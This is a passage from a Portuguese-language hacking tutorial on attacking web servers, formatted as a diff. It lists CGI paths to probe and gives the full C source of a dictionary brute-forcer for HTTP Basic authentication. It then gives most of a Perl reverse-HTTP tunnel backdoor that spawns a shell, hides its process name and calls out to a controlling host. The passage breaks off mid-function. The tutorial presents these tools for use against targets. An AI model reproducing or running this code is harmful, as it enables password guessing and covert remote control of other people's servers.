+testcgi $1 /ws_ftp.ini
+testcgi $1 /~
+testcgi $1 /~bin
+testcgi $1 /~guest
+testcgi $1 /~log
+testcgi $1 /~logs
+testcgi $1 /~lp
+testcgi $1 /~named
+testcgi $1 /~root
+testcgi $1 /~test
+testcgi $1 /~tmp
+---------------------------------------------------------------------------
+
+Como voce pode ver ele procura muito CGI, isto nao eh nada bom, mas estou
+colocando apenas para exemplificar uma automacao de CGI.Na maioria das
+vezes ele dah uma resposta errada, pois o comportamento de resposta de
+um Servidor WEB muda muito, veremos isso mais em detalhes na parte de
+Brutal Forces.No entanto se ele encontrar uma vulnerabilidade, ou seja,
+um CGI valido, como sao muitos CGIs fica praticamente impossivel voce ter
+em mente uma 'exploitacao' associada a cada uma das centenas de 
+possibilidades que possa vir a surgir, eu recomendo o seguinte: Vai em
+"http://www.securityfocus.com/search" e manda procurar na 'BugTraq' 
+informacoes a respeito do CGI que voce encontrou.Os mais velhos conhecem
+bem a mais conhecida tecnica de exploitacao de CGI que eu jah vih, a
+do 'PHF' e por incrivel que pareca, ainda hoje existem servidores 
+vulneraveis a isto.
+
+2.4. - Furos em HTML
+---------------------
+
+Se os CGIs sao um problema serio, os Furos em HTML conseguem ser ainda
+piores.Mah implementacao de paginas HTML pode significar um serio risco
+a seguranca de uma rede, no entanto, como isto eh uma pratica comum de
+usuarios leigos, um dominio que serve paginas para muitas pessoas pode ser
+um alvo em potencial.
+
+* Problemas com SSI:
+
+SSI se refere a Server Side Includes(Inclusoes do Lado do Servidor).Eh um
+esquema para uso na WEB que fornece um mecanismo de funcionalidade
+interativa de tempo real sem programacao.Ele eh usado por exemplo para
+obter a data/hora do sistema ou para executar um comando local e avaliar
+a resposta a fim de tomar uma decisao de fluxo de programa.Sao varios os
+recursos SSI, inclusive, echo,include,fsize,flastmod,exec,config,odbc,
+email,if,goto,label e break.Dois comandos destes nos sao de maior
+interesse que eh exec e email.Tambem abordarei os SSI num outro txt, mas
+se voce quer ir adiantando, no link abaixo voce pode ver mais coisas
+sobre isto:
+
+http://www.absoluta.org/cgi/cgi_ssi.htm
+
+* Problemas com Marcas Hidden:
+
+Marcas Hidden sao usadas para ocultar determinados parametros em uma
+pagina HTML.No entanto se um atacante obtem acesso ao codigo fonte(trivial
+neste caso) ele pode alterar os atributos de uma marca hidden e atraves
+do browser se beneficiar deste esquema.
+
+
+2.4. - Brutal Force
+--------------------
+
+Hoje em dia um conceito dominante quando se 'luta' contra ferramentas IDS
+eh o seguinte: "SE TEM IDS, BRUTAL FORCE NEM PENSAR!"; Esta tecnica eh
+uma tecnica muito "barulhenta", eh muito dificil nao deixar rastros que
+qualquer Administrador de Redes responsavel nao detecte.Deve-se ter muito
+cuidado com a implementacao desta tecnica, mas pode ser uma boa tecnica
+em sistemas que utilizam Firewalls em servicos de Autenticacao(ssh, pop,
+imap, telnet e etc), mas nao usam IDS ou nao configuram um IDS para prestar
+atencao a Conexoes num servico de autenticacao via porta 80.
+Os esquemas para implementacao de um Brutal Force a um Servidor WEB variam
+muito, pois a resposta dada as requisicoes de Autenticacao podem ser
+diversas e na maioria dos casos 'exclusivas' ou seja, o atacante deve
+estar preparado para personalizar sua ferramenta para se adaptar as respostas
+dada pelo Servidor WEB.O Melhor esquema de Ferramenta para Brutal Force
+que pode existir, ao meu ver, eh justamente criar um Brutal Force especifico
+para a rede alvo.
+Existem varios brutais forces disponiveis na Internet para implementar uma
+investida no servidor WEB, na parte 'Links e Referencias' eu disponibilizo
+alguns Brutal Forces para http.Abaixo segue o codigo fonte de um:
+
+----------------------------- brute_web.c ---------------------------------
+/*
+ *   Brute Force your way into a Web Server.
+ *   -Works best on computers in the same subnet :-)
+ *   Coded by BeastMaster V on April 24, 1997.
+ *   Email questions or comments to:
+ *              bryan@scott.net
+ *
+ *   In order to use this:
+ *   1) Get a dictionary file.
+ *      http://www.rootshell.com/hacking/crack_dict.txt.gz
+ *   2) Compile this program, and run it. The arguments are-
+ *      username dictfile hostname port
+ *         << most websites have 'admin' as a user >>
+ *   3) Wait for user name and password to appear.
+ *
+ *   NOTE: If you want to see the webserver's response,
+ *   define VERBOSE when compiling.
+ *
+ *   WARNING: If the webserver logs, it will
+ *   be obvious that you are attacking!
+ *
+ *   DISCLAIMER: Please use this program in a
+ *   responsible manner.
+ *
+ */
+
+#include <errno.h>
+#include <signal.h>
+#include <stdio.h>
+#include <string.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/time.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <termio.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/errno.h>
+
+extern int errno;
+
+/* Change this to whatever document you want to get off the web server */
+#define DEFAULT_DOCUMENT "/"
+
+char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+                  "0123456789+/";
+
+unsigned char buf_64[512];
+
+unsigned short socket_timeout=20;
+char line[2048];
+
+enum TOKENTYPE { NONE, BLANKS, PUNCT, TAG, NAME, CONTENT };
+
+struct TOKEN {
+                char *text;
+                int  length;
+                int  index;
+                enum TOKENTYPE type;
+             };
+
+struct BASE64_PARAMS {
+                        unsigned long int accum;
+                        int               shift;
+                        int               save_shift;
+                     };
+
+int read_dict_file ( char *buff, FILE *f )
+{
+int b, i;
+*buff = 0;
+do {
+while ((b = fgetc(f)) != EOF && (b == ' '||b == '\t'||b =='\n' ||b == '\r'));
+        if ( b == EOF ) return(0);
+        for ( i = 0; b != EOF && b != '\n' && b != '\r'; i++ )
+        {
+            buff[i] = (b == '\t') ? ' ': b;
+            b = fgetc(f);
+        }
+        buff[i] = 0;
+   }
+   while (*buff == '#');
+
+   return(1);
+}
+
+
+void    (*r_signal(sig, func, fd_socket, fd_accept)) (int)
+int     sig;
+void    (*func) ();
+int fd_socket;
+int fd_accept;
+{
+        struct sigaction act, oact;
+
+        act.sa_handler = func;
+
+        sigemptyset(&act.sa_mask);
+        act.sa_flags = 0;
+#ifdef SA_RESTART
+        act.sa_flags |= SA_RESTART;
+#endif
+        if (sigaction(sig, &act, &oact) < 0)
+                return (SIG_ERR);
+
+        return (oact.sa_handler);
+}
+
+
+/* Read 'n' bytes from a descriptor  */
+int readn(fd, ptr, nbytes)
+register int fd;
+register char *ptr;
+register int nbytes;
+{
+        int nleft, nread;
+
+        nleft=nbytes;
+        while(nleft > 0) {
+                nread=read(fd,ptr,nleft);
+
+                if (nread<0)
+                        return(nread);
+                else if (nread==0)
+                        break;
+
+                nleft -=nread;
+                ptr +=nread;
+        }
+        return(nbytes-nleft);
+}
+
+/* Write 'n' bytes to a descriptor */
+int writen(fd, ptr, nbytes)
+register int fd;
+register char *ptr;
+register int nbytes;
+{
+        int nleft, nwritten;
+
+        nleft=nbytes;
+        while(nleft > 0) {
+                nwritten=write(fd, ptr, nleft);
+                if(nwritten <= 0)
+                        return(nwritten);
+
+                nleft -= nwritten;
+                ptr += nwritten;
+        }
+        return(nbytes-nleft);
+}
+
+char * dateTime()
+{
+        time_t t;
+        char * s;
+        time(&t);
+        s = (char *)ctime((const time_t *)&t);
+        s[24] = '\0';
+        return s;
+}
+
+void handle_SIGSEGV (void)
+{
+        fprintf(stderr, "\nSegmentation Violation! [%s]\n", dateTime());
+        exit(1);
+}
+
+void handle_SIGINT (void)
+{
+        fprintf(stderr, "\nSignal Interrupt! [%s]\n", dateTime());
+        exit(1);
+}
+
+void sendln(int s, char buf[1024]) {
+        writen(s, buf, strlen(buf), 0);
+}
+
+int readln(int s)
+{
+        int i,done=0,w, result;
+        char tmp[1];
+        struct timeval timeout;
+        fd_set inputs;
+
+        sprintf(line,"");
+        i = 0;
+
+        while (!done) {
+             FD_ZERO(&inputs);
+             FD_SET(s, &inputs);
+             timeout.tv_sec = socket_timeout;
+                timeout.tv_usec = 0;
+ result = select(FD_SETSIZE, &inputs,(fd_set *)0, (fd_set *)0,&timeout);
+                switch(result) {
+                case 0:
+                        printf("\n\nSocket Timeout\n");
+                        exit(1);
+                        break;
+                case -1:
+                        perror("select");
+                        exit(1);
+                        break;
+                default:
+                        w=readn(s ,tmp, 1);
+                        break;
+                }
+                if (w==0)  return 0;
+
+
+                if (tmp[0] != 0) {
+                        line[i] = tmp[0];
+                }
+                if (line[i] == '\n') {
+                        done = 1;
+                }
+                i++;
+        }
+        line[i] = 0;
+        return (i);
+}
+
+/* Code to call out on a socket */
+int call_socket(hostname, portnum)
+char *hostname;
+u_short portnum;
+{
+        struct sockaddr_in sa;
+        struct hostent *hp;
+        int a, s, foo=1;
+
+ if ((hp= gethostbyname(hostname)) == NULL) { /* do we know the host's */
+                errno= ECONNREFUSED; /* address? */
+                return(-1); /* no */
+        }
+
+        bzero(&sa,sizeof(sa));
+        bcopy(hp->h_addr,(char *)&sa.sin_addr,hp->h_length); /* set address */
+        sa.sin_family= hp->h_addrtype;
+        sa.sin_port= htons((u_short)portnum);
+
+        if ((s= socket(hp->h_addrtype,SOCK_STREAM,0)) < 0) /* get socket */
+                return(-1);
+
+#ifdef SOCKET_OPTS
+        /* set socket options so we can try multiple connects */
+
+
+if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,(char *)&foo,sizeof(foo))==-1) {
+fprintf(stderr, "Error setting SO_REUSEADDR socket option in call_socket!\n");
+                fflush((FILE *)stderr);
+                exit(1);
+        }
+#endif
+
+        if (connect(s,(struct sockaddr *)&sa,sizeof sa) < 0) { /* connect */
+                perror("connect failed");
+                exit(1);
+        }
+
+        return(s);
+}
+
+int base64_encode(int quit, struct BASE64_PARAMS *e_p,char *string_to_encode)
+{
+   int index;
+   unsigned long int value;
+   unsigned char blivit;
+   int z=0;
+
+   index = 0;
+   while ( ( *(string_to_encode+z) ) || (e_p->shift != 0) )
+   {
+      if ( ( *(string_to_encode+z) ) && ( quit == 0 ) )
+      {
+         blivit = *(string_to_encode +z);
+         z++;
+
+         if ( *(string_to_encode+z)==0 )
+         {
+            quit = 1;
+            e_p->save_shift = e_p->shift;
+            blivit = 0;
+         }
+      }
+      else
+      {
+         quit = 1;
+         e_p->save_shift = e_p->shift;
+         blivit = 0;
+      }
+
+      if ( (quit == 0) || (e_p->shift != 0) )
+      {
+         value = (unsigned long)blivit;
+         e_p->accum <<= 8;
+         e_p->shift += 8;
+         e_p->accum |= value;
+      } /* ENDIF */
+
+      while ( e_p->shift >= 6 )
+      {
+
+         e_p->shift -= 6;
+         value = (e_p->accum >> e_p->shift) & 0x3Fl;
+         blivit = alphabet[value];
+         buf_64[index++] = blivit;
+         if ( index >= 60 )
+         {
+            buf_64[index] = '\0';
+            /* printf( "%s\n", buf_64 ); */
+            index = 0;
+         }
+         if ( quit != 0 )
+         {
+            e_p->shift = 0;
+         }
+      }
+   }
+
+   if      ( e_p->save_shift == 2 )
+   {
+      buf_64[index++] = '=';
+      if ( index >= 60 )
+      {
+         buf_64[index] = '\0';
+         /* printf( "%s\n", buf_64 ); */
+         index = 0;
+      }
+
+      buf_64[index++] = '=';
+      if ( index >= 60 )
+      {
+         buf_64[index] = '\0';
+         /* printf(  "%s\n", buf_64 ); */
+         index = 0;
+      }
+   }
+   else if ( e_p->save_shift == 4 )
+   {
+      buf_64[index++] = '=';
+      if ( index >= 60 )
+      {
+         buf_64[index] = '\0';
+         /* printf( "%s\n", buf_64 ); */
+         index = 0;
+      }
+   }
+
+   if ( index != 0 )
+   {
+      /* buf_64[index-1]='='; */
+      buf_64[index] = '\0';
+      /* printf( "%s\n", buf_64 ); */
+   }
+
+   return quit;
+}
+
+void encode_string (char *namepass)
+{
+  struct BASE64_PARAMS e_p;
+  int quit=0;
+  register int i;
+  char * some;
+
+  e_p.shift = 0;
+  e_p.accum = 0;
+
+  some=(char *)malloc(256);
+
+  /* Nasty hack (forgive the lame coding...) */
+  some = (char *)namepass;
+  for (i=0;*(some+i);i++);
+  *(some+i)=*(some+i-1);
+  *(some+i+1)='\0';
+
+  base64_encode(quit, &e_p, (char *)some);
+}
+
+void sorry (void)
+{
+printf("\nSorry, but I could not get in.\n");
+printf("There are two reasons why:\n");
+printf("1) The user (argv[1]) does not exist on the webserver.\n");
+printf("2) The user exists, but his/her passwd was not in your dict_file.\n");
+printf("Have a Nice Day. :-)\n\n");
+exit(0);
+}
+
+void usage(char *prog_name)
+{
+printf("\nUsage: ");
+printf("[%s] username dictfile hostname port\n", prog_name);
+printf("\n");
+exit(0);
+}
+
+int main ( argc, argv )
+unsigned int argc;
+char **argv;
+{
+
+   FILE * dict_fd=NULL;
+   struct hostent *hp;
+   unsigned short web_port=0;
+   int sock_fd=0;
+   char * dict_word=NULL;
+   char export_buff[1024];
+   char * encoded_buffer=NULL;
+   unsigned short finish_flag=1, success=0;
+   int foo;
+
+        if ( argc !=5 )
+                usage(argv[0]);
+
+        r_signal(SIGSEGV, handle_SIGSEGV);
+        r_signal(SIGINT, handle_SIGINT);
+
+        dict_word= (char *)malloc (256);
+
+if ((dict_fd=fopen(argv[2], "r"))==NULL ) {
+fprintf(stderr, "\nCould not open dictionary file: [%s]\n%s\n\n",
+                argv[2], strerror(errno));
+                exit(1);
+        }
+
+if ((hp=(struct hostent *)gethostbyname((char *)argv[3])) == NULL) {
+fprintf(stderr, "\nCould not resolve hostname: [%s]\n\n", argv[3]);
+                exit(1);
+        }
+
+        web_port = atoi(argv[4]);
+
+        encoded_buffer=(char *)malloc(512);
+
+        while (read_dict_file(dict_word, dict_fd)) {
+                if ((sock_fd=call_socket(argv[3], web_port))==-1) {
+                        perror("socket connection");
+                        exit(1);
+                }
+
+#ifndef SOLARIS
+                if ((foo=ioctl(sock_fd, FIONBIO , 1))==-1) {
+                         perror("ioctl");
+                         exit(1);
+                }
+#else
+                if ((foo=fcntl(sock_fd, O_NDELAY, 1)) <0) {
+                         perror("ioctl");
+                         exit(1);
+                }
+
+#endif
+                sprintf(export_buff, "GET / HTTP/1.0\n");
+                sendln(sock_fd, export_buff);
+
+                sprintf(encoded_buffer, "%s:%s", argv[1], dict_word);
+                encode_string(encoded_buffer);
+                sprintf(export_buff, "Authorization: Basic %s\n\n",buf_64);
+                sendln(sock_fd, export_buff);
+
+                memset(line, '\0', sizeof(line));
+                while( readln(sock_fd)) {
+
+#ifdef VERBOSE
+                printf("%s", line);
+                fflush((FILE *)stdout);
+#endif
+
+                /* Change this to a more sophisticated test. */
+                /* This test is pretty lame, but works for */
+                /* all practical purposes. */
+                if (strstr(line, "nauthorized"))
+                        finish_flag=0;
+                }
+
+                if (finish_flag) {
+                        close(sock_fd);
+                        finish_flag=1;
+                        success=1;
+                        break;
+                }
+
+                finish_flag=1;
+                close(sock_fd);
+
+        }
+
+        fclose(dict_fd);
+        if (!success)
+                sorry();
+        else {
+                printf("\n\nThe UserName is: %s\n", argv[1]);
+                printf("The Password is: %s\n", dict_word);
+                printf("\n\n\n ---- Coded by BeastMaster V ----\n");
+                exit(0);
+        }
+
+}
+--------------------------------------------------------------------------
+
+Enorme este programa, um belo algoritmo, mas tambem possui suas limitacoes.
+Eu ando escrevendo um brutal force para isto faz tempo, mas o proprio
+tempo nao vem deixando eu terminar este programa, mas em todo caso, ele
+tambem eh bem especifico, talvez num futuro proximo ele possa ser inserido
+em algum txt.
+
+--------------
+3 - BACKDOORS |
+--------------
+
+Os Servidores WEB sao bem mais uteis do que apenas para serem usados para
+se alterar uma pagina.Eh possivel criar backdoors que recebam comandos e
+executem os mesmos atraves do Servidor WEB.Varios sao os esquemas de
+backdoors que podem ser implementados atraves do protocolo HTTP e do
+Servidor WEB.Uma vez que um atacante tenha obtido acesso e adquirido
+status de super usuario no sistema, as possibilidades se tornam infindaveis.
+Abaixo seguem dois esquemas de backdoors via Servidor WWW e CGI.
+
+3.1. - HTTP Tunel
+------------------
+
+Mais uma vez os tuneis estao presentes.O Conceito de backdoors sobre
+Firewalls eh extensivel ao uso de backdoors sobre protocolos, canalizando
+assim um Tunel capaz de funcionar como uma via a espera de comunicacao
+(Conceito Cliente/Servidor).Um Tunel em HTTP pode funcionar de diversos
+modos, mas na maioria dos casos eh atraves de requisicoes de URLs que os
+comandos sao enviados e processados no servidor alvo.
+O pessoal da The Hackers Choice postou um excelente exemplo de backdoor
+via HTTP, que pode ser visto abaixo:
+
+--------------------------- rwwwshell-1.6.perl -----------------------------
+#!/usr/bin/perl
+#
+# Reverse-WWW-Tunnel-Backdoor v1.6
+# (c) 1998 by van Hauser / [THC] - The Hacker's Choice<vh@reptile.rug.ac.be>
+# Check out http://r3wt.base.org for updates
+# Proof-of-Concept Program for the paper "Placing Backdoors through Firewalls"
+# available at the website above in the "Articles" section.
+#
+
+# Greets to all THC, ADM, arF and #bluebox guys
+
+# verified to work on Linux, Solaris, AIX and OpenBSD
+
+# BUGS: some Solaris machines: select(3) is broken, won't work there
+#       on some systems Perl's recv is broken :-( (AIX, OpenBSD) ...
+#       we can't make proper receive checks here. Workaround implemented.
+#
+# HISTORY:
+# v1.6: included www-proxy authentication ;-))
+# v1.4: porting to various unix types (and I thought perl'd be portable...)
+# v1.3: initial public release of the paper including this tool
+
+#
+# GENERAL CONFIG (except for $MASK, everything must be the same
+#                 for MASTER and SLAVE is this section!)
+#
+$CGI_PREFIX="/cgi-bin/order?";  # should look like cgi. "?" as last char!
+$MASK="vi";                     # for masking the program's process name
+$PASSWORD="THC";                # anything, nothing you have to rememeber
+                                # (not a real "password" anyway)
+#
+# MASTER CONFIG (specific for the MASTER)
+#
+$LISTEN_PORT=8080;      # on which port to listen (80 [needs root] or
+8080)
+$SERVER="127.0.0.1";    # the host to run on (ip/dns) (the SLAVE needs
+this!)
+
+#
+# SLAVE CONFIG (specific for the SLAVE)
+#
+$SHELL="/bin/sh -i";    # program to execute (e.g. /bin/sh)
+$DELAY="3";             # time to wait for output after your command(s)
+#$TIME="00:01";         # time when to connect to the master (unset if now)
+#$DAILY="yes";          # tries to connect once daily if set with something
+#$PROXY="127.0.0.1";    # set this with the Proxy if you must use one
+#$PROXY_PORT="3128";    # set this with the Proxy Port if you must use one
+#$PROXY_USER="user";    # username for proxy authentication
+#$PROXY_PASSWORD="pass";        # password for proxy authentication
+#$DEBUG="";             # for debugging purpose, turn off when in
+production
+$BROKEN_RECV="yes";     # For AIX & OpenBSD, NOT for Linux & Solaris
+
+# END OF CONFIG         # nothing for you to do after this point #
+
+################## BEGIN MAIN CODE ##################
+
+require 5.002;
+use Socket;
+
+$|=1;                           # next line changes our process name
+if ($MASK) { for ($a=1;$a<80;$a++){$MASK=$MASK."\000";}  $0=$MASK; }
+undef $DAILY   if (! $TIME);
+if ( !($PROXY) || !($PROXY_PORT) ) {
+        undef $PROXY;
+        undef $PROXY_PORT;
+}
+$protocol = getprotobyname('tcp');
+
+if ($ARGV[0] ne "") {
+        if ($ARGV[0] eq "-h") {
+                print STDOUT "no commandline option : daemon mode\n";
+                print STDOUT "using \"-h\" as option  : this help\n";
+                print STDOUT "any other option      : slave mode\n";
+                exit(0);
+        } else {
+                print STDOUT "starting in slave mode\n";
+                $SLAVE_MODE = "yeah";
+        }
+}
+
+if (! $SLAVE_MODE) {
+        &master;
+} else {
+        &slave;
+}
+# END OF MAIN FUNCTION
+
+############### SLAVE FUNCTION ###############
+
+sub slave {
+        $pid = 0;
+        if ($PROXY) {           # setting the real config (for Proxy Support)
+                $REAL_SERVER = $PROXY;
+                $REAL_PORT = $PROXY_PORT;
+               $REAL_PREFIX = "GET http://" . $SERVER . ":" . $LISTEN_PORT
+                        . $CGI_PREFIX;
+                $PROXY_SUFFIX = "Pragma: no-cache\n";
+                if ( $PROXY_USER && USER_PASSWORD ) {
+                        &base64encoding;
+                        $PROXY_SUFFIX = $PROXY_SUFFIX . $PROXY_COOKIE;
+                }
+        } else {
+                $REAL_SERVER = $SERVER;
+                $REAL_PORT = $LISTEN_PORT;
+                $REAL_PREFIX = "GET " . $CGI_PREFIX;
+        }
+AGAIN:  if ($pid) { kill 9, $pid; }
+        if ($TIME) {                    # wait until the specified $TIME
+                $TIME =~ s/^0//;        $TIME =~ s/:0/:/;
+                (undef,$min,$hour,undef,undef,undef,undef,undef,undef)
+                        = localtime(time);
+                $t=$hour . ":" . $min;
+                while ($TIME ne $t) {
+                        sleep(28); # every 28 seconds we look at the watch
+                (undef,$min,$hour,undef,undef,undef,undef,undef,undef)
+                                = localtime(time);
+                        $t=$hour . ":" .$min;
+                }
+        }
+        print STDERR "Slave activated\n"        if $DEBUG;
+        if ($DAILY) {                   # if we must connect daily, we'll
+                if (fork) {             # fork the daily shell process to
+                        sleep(69);      # ensure the master control process
+                        goto AGAIN;     # won't get stuck by a fucking cmd
+                }                       # the user executed.
+        print STDERR "forked\n" if $DEBUG;
+        }
+        $address = inet_aton($REAL_SERVER) || die "can't resolve server\n";
+        $remote = sockaddr_in($REAL_PORT, $address);
+        $forked = 0;
+
+GO:     close(THC);
+        socket(THC, &PF_INET, &SOCK_STREAM, $protocol)
+                or die "can't create socket\n";
+        setsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);
+        if (! $forked) {                # fork failed? fuck, let's try again
+                pipe R_IN, W_IN;        select W_IN;  $|=1;
+                pipe R_OUT, W_OUT;      select W_OUT; $|=1;
+                $pid = fork;
+                if (! defined $pid) {
+                        close THC;
+                        close R_IN;     close W_IN;
+                        close R_OUT;    close W_OUT;
+                        goto GO;
+                }
+                $forked = 1;
+        }
+        if (! $pid) {           # this is the child process (execs $SHELL)
+                close R_OUT;    close W_IN;     close THC;
+                print STDERR "forking $SHELL in child\n"        if $DEBUG;
+                open STDIN,  "<&R_IN";
+                open STDOUT, ">&W_OUT";
+                open STDERR, ">&W_OUT";
+                exec $SHELL || print W_OUT "couldn't spawn $SHELL\n";
+                close R_IN;     close W_OUT;
+                exit(0);
+        } else {                # this is the parent (data control + network)
+                close R_IN;
+                sleep($DELAY);  # we wait $DELAY for the commands to complete
+                vec($rs, fileno(R_OUT), 1) = 1;
+                print STDERR "before: allwritten2stdin\n"       if $DEBUG;
+                select($r = $rs, undef, undef, 30);
+                print STDERR "after : wait for allwritten2stdin\n" if $DEBUG;
+                sleep(1);       # The following readin of the command output
+                $output = "";   # looks weird. It must be! every system
+                vec($ws, fileno(W_OUT), 1) = 1;     # behaves different :-((
+                print STDERR "before: readwhiledatafromstdout\n"   if $DEBUG;
+                while (select($w = $ws, undef, undef, 1)) {
+                        read R_OUT, $readout, 1 || last;
+                        $output = $output . $readout;
+                }
+                print STDERR "after : readwhiledatafromstdout\n"   if $DEBUG;
+                print STDERR "before: fucksunprob\n"    if $DEBUG;
+                vec($ws, fileno(W_OUT), 1) = 1;
+                while (! select(undef, $w=$ws, undef, 0.001)) {
+                        read R_OUT, $readout, 1 || last;
+                        $output = $output . $readout;
+                }
+                print STDERR "after : fucksunprob\n"    if $DEBUG;
+                print STDERR "send 0byte to stdout, fail->exit\n"   if $DEBUG;
+                print W_OUT "\000" || goto ENDE;
+                print STDERR "before: readallstdoutdatawhile!eod\n" if $DEBUG;
+                while (1) {
+                        read R_OUT, $readout, 1 || last;
+                        last  if ($readout eq "\000");
+
+                        $output = $output . $readout;
+                }
+                print STDERR "after : readallstdoutdatawhile!eod\n" if $DEBUG;
+                &uuencode;      # does the encoding of the shell output
+                $encoded = $REAL_PREFIX . $encoded;
+                $encoded = $encoded . $PROXY_SUFFIX     if ($PROXY);
+                $encoded = $encoded . "\n";
+                print STDERR "connecting to remote, fail->exit\n" if $DEBUG;
+                connect(THC, $remote) || goto ENDE;     # connect to master
+                print STDERR "send encoded data, fail->exit\n" if $DEBUG;
+                send (THC, $encoded, 0) || goto ENDE;   # and send data
+                $input = "";
+                vec($rt, fileno(THC), 1) = 1;  # wait until master sends reply
+                print STDERR "before: wait4answerfromremote\n"  if $DEBUG;
+                while (! select($r = $rt, undef, undef, 0.00001)) {}
+                print STDERR "after : wait4answerfromremote\n"  if $DEBUG;
+                print STDERR "read data from socket until eod\n" if $DEBUG;
+                $error="no";
+                while (1) {             # read until EOD (End Of Data)
+                        print STDERR "?"        if $DEBUG;
+        # OpenBSD 2.2 can't recv here! can't get any data! sucks ...
+                        recv (THC, $readin, 1, 0) || undef $error;
+                        if ((! $error) and (! $BROKEN_RECV)) { goto OK; }
+                        print STDERR "!"        if $DEBUG;
+                        goto OK  if (($readin eq "\000") or ($readin eq "\n")
+                                or ($readin eq ""));
+                        $input = $input . $readin;
+                }
+OK:             print STDERR "\nall data read, entering OK\n"   if $DEBUG;
+                $input =~ s/\n//gs;
+                &uudecode;              # decoding the data from the master
+                print STDERR "if password not found -> exit\n"  if $DEBUG;
+                goto ENDE  if ( $decoded =~ m/^$PASSWORD/s == 0);
+                $decoded =~ s/^$PASSWORD//;
+                print STDERR "writing input data to $SHELL\n"   if $DEBUG;
+                print W_IN "$decoded" || goto ENDE;     # sending the data
+
+                sleep(1);                               # to the shell proc.
+                print STDERR "jumping to GO\n"  if $DEBUG;
+                goto GO;
+        }
+ENDE:   kill 9, $pid;   $pid = 0;
+        exit(0);
+} # END OF SLAVE FUNCTION
+
+############### MASTER FUNCTION ###############
+
+sub master {
+        socket(THC, &PF_INET, &SOCK_STREAM, $protocol)
+                or die "can't create socket\n";
+        setsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);
+        bind(THC, sockaddr_in($LISTEN_PORT, INADDR_ANY)) || die "can't bind\n";
+        listen(THC, 3) || die "can't listen\n";         # print the HELP
+        print STDOUT '
+Welcome to the Reverse-WWW-Tunnel-Backdoor v1.6 by van Hauser / THC ...
+
+
+Introduction:   Wait for your SLAVE to connect, examine it\'s output and then
+                type in your commands to execute on SLAVE. You\'ll have to
+                wait min. the set $DELAY seconds before you get the output
+                and can execute the next stuff. Use ";" for multiple commands.
+                Trying to execute interactive commands may give you headache
+                so beware. Your SLAVE may hang until the daily connect try
+                (if set - otherwise you lost).
+                You also shouldn\'t try to view binary data too ;-)
+                "echo bla >> file", "cat >> file <<- EOF", sed etc. are your
+                friends if you don\'t like using vi in a delayed line mode ;-)
+                To exit this program on any time without doing harm to either
+                MASTER or SLAVE just press Control-C.
+                Now have fun.';
+
+YOP:    print STDOUT "\nWaiting for connect ...";
+        $remote=accept (S, THC)  ||  goto YOP;          # get the connection
+        ($r_port, $r_slave)=sockaddr_in($remote);       # and print the
+SLAVE
+        $slave=gethostbyaddr($r_slave, AF_INET);        # data.
+        $slave="unresolved" if ($slave eq "");
+        print STDOUT " connect from $slave/".inet_ntoa($r_slave).":$r_port\n";
+        select S;       $|=1;
+        select STDOUT;  $|=1;
+        $input = "";
+        vec($socks, fileno(S), 1) = 1;
+        $error="no";
+        while (1) {                     # read the data sent by the slave
+                while (! select($r = $socks, undef, undef, 0.00001)) {}
+                recv (S, $readin, 80, 0) || undef $error;
+                if ((! $error) and (! $BROKEN_RECV)) {
+                    print STDOUT "[disconnected]\n";
+                }
+                $readin =~ s/\r//g;
+                $input = $input . $readin;
+                last  if ( $input =~ m/\n\n/s );
+
+        }
+        &hide_as_broken_webserver  if ( $input =~ m/$CGI_PREFIX/s == 0 );
+        $input =~ s/^.*($CGI_PREFIX)\??//s;
+        $input =~ s/\n.*$//s;
+        &uudecode;              # decoding the data from the slave
+        &hide_as_broken_webserver  if ( $decoded =~ m/^$PASSWORD/s == 0 );
+        $decoded =~ s/^$PASSWORD//s;
+        $decoded = "[Warning! No output from remote!]\n>" if ($decoded eq"");
+        print STDOUT "$decoded";        # showing the slave output to the user
+        $output = <STDIN>;              # and get his input.
+        &uuencode;              # encode the data for the slave
+        send (S, $encoded, 0) || die "\nconnection lost!\n";    # and send it
+        close (S);
+        print STDOUT "sent.\n";
+        goto YOP;               # wait for the next connect from the slave
+} # END OF MASTER FUNCTION
+
+
+
+###################### MISC. FUNCTIONS #####################
+
+sub uuencode {  # does the encoding stuff for error-free data transfer via WWW
+        $output = $PASSWORD . $output;          # PW is for error checking and
+        $uuencoded = pack "u", "$output";       # preventing sysadmins from
+        $uuencoded =~ tr/'\n)=(:;&><,#$*%]!\@"`\\\-'    # sending you weird
+                        /'zcadefghjklmnopqrstuv'        # data. No real
+                        /;                              # security!
+        $uuencoded =~ tr/"'"/'b'/;
+        if ( ($PROXY) && ($SLAVE_MODE) ) {# proxy drops request if > 4kb
+                $codelength = (length $uuencoded) + (length $REAL_PREFIX) +12;
+                $cut_length = 4099 - (length $REAL_PREFIX);
+                $uuencoded = pack "a$cut_length", $uuencoded
+                        if ($codelength > 4111);
+        }
+        $encoded = $uuencoded;
+        $encoded = $encoded . " HTTP/1.0\n"    if ($SLAVE_MODE);
+} # END OF UUENCODE FUNCTION
+
+
+sub uudecode {  # does the decoding of the data stream
+        $input =~     tr/'zcadefghjklmnopqrstuv'
+                        /'\n)=(:;&><,#$*%]!\@"`\\\-'
+                        /;
+        $input =~     tr/'b'/"'"/;
+        $decoded = unpack "u", "$input";
+} # END OF UUDECODE FUNCTION
+
+sub base64encoding {    # does the base64 encoding for proxy passwords
+        $encode_string = $PROXY_USER . ":" . $PROXY_PASSWORD;
+        $encoded_string = substr(pack('u', $encode_string), 1);
+        chomp($encoded_string);
+        $encoded_string =~ tr|` -_|AA-Za-z0-9+/|;
+        $padding = (3 - length($encode_string) % 3) % 3;
+        $encoded_string =~ s/.{$padding}$/'=' x $padding/e if $padding;
+        $PROXY_COOKIE = "Proxy-authorization: Basic " . $encoded_string. "\n";
+} # END OF BASE64ENCODING FUNCTION
+
+
+sub hide_as_broken_webserver {  # invalid request -> look like broken server
+        send (S, "<HTML><HEAD>\n<TITLE>404 File Not Found</TITLE>\n</HEAD>".
